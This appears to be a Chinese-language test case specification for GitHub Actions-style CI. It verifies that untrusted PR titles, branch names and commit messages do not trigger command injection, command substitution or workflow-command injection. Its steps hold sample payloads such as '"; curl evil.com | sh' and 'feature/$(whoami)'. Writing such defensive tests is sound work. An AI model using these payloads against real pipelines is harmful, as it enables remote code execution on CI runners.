用例 ID:   COMPAT-INJECT-02-001
维度标签:   [compatibility, security]
维度:      兼容性
优先级:    P1
溯源意图:  INTENT-COMPAT-026
标题:      不可信输入注入防护对标：验证 PR 标题/分支名/commit message 在表达式中的处理安全

前置条件:
  - fork PR 中包含特殊字符的标题、分支名、commit message

操作步骤:
  1. 测试将 PR 标题通过 `${{ }}` 嵌入 run 脚本
  2. 测试 PR 标题含命令注入 payload（如 `"; curl evil.com | sh`）→ 不应被执行
  3. 测试分支名含特殊字符（如 `feature/$(whoami)`）→ 不执行命令替换
  4. 测试 commit message 含 `::warning::` workflow 命令 → 不应注入日志注解
  5. 验证 secrets 在 if: 条件中不可用

预期结果:
  - 不可信输入嵌入 echo 参数中正常工作
  - 命令注入 payload 不被执行
  - secrets 在 if: 中不可用

验证点:
  - [正向] PR 标题通过 ${{ }} 嵌入 echo 正常工作
  - [负向] PR 标题中命令注入 payload 不被执行
  - [负向] 分支名 command substitution 不被执行
  - [负向] 不可信输入不注入 :: 命令
  - [负向] secrets 在 if: 条件中不可用

清理:      fixture
